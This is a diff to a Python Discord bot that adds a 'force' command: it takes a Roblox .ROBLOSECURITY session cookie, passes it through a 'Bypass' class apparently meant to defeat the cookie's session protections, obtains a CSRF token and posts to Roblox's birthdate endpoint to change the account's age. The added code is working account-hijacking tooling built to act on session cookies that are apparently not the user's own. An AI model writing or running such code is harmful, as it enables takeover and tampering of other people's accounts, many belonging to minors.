@@ -246,6 +246,46 @@ async def full(ctx, cookie=None):
         embedVar = nextcord.Embed(title=":x: Error", description="", color=0xFFFF00)
         embedVar.add_field(name="Error: ", value='```'+response.text+'```', inline=False)
         await ctx.send(embed=embedVar)
+        
+@bot.command()
+@commands.cooldown(1, 10, commands.BucketType.user)
+async def force(ctx, cookie: str):
+    try:
+        bypasser = Bypass(cookie)
+        new_cookie = bypasser.start_process()
+
+        if "Error" in new_cookie:
+            await ctx.send(f"Bypass failed: {new_cookie}")
+            return
+
+        # Get fresh CSRF token with new cookie
+        xcsrf_token = bypasser.get_csrf_token()
+
+        headers = {
+            "x-csrf-token": xcsrf_token,
+            "Content-Type": "application/json",
+            "User-Agent": "Roblox/WinInet"
+        }
+
+        # Attempt to change birthdate
+        response = requests.post(
+            "https://accountinformation.roblox.com/v1/birthdate",
+            headers=headers,
+            cookies={".ROBLOSECURITY": new_cookie},
+            json={
+                "birthMonth": 1,
+                "birthDay": 1,
+                "birthYear": 2010  # You can customize this
+            }
+        )
+
+        if response.status_code == 200:
+            await ctx.send("Successfully changed account age.")
+        else:
+            await ctx.send(f"Failed to change age. Roblox responded with: {response.text}")
+
+    except Exception as e:
+        await ctx.send(f"An error occurred: {str(e)}")
 
 # Start Flask server and bot together
 if __name__ == "__main__":
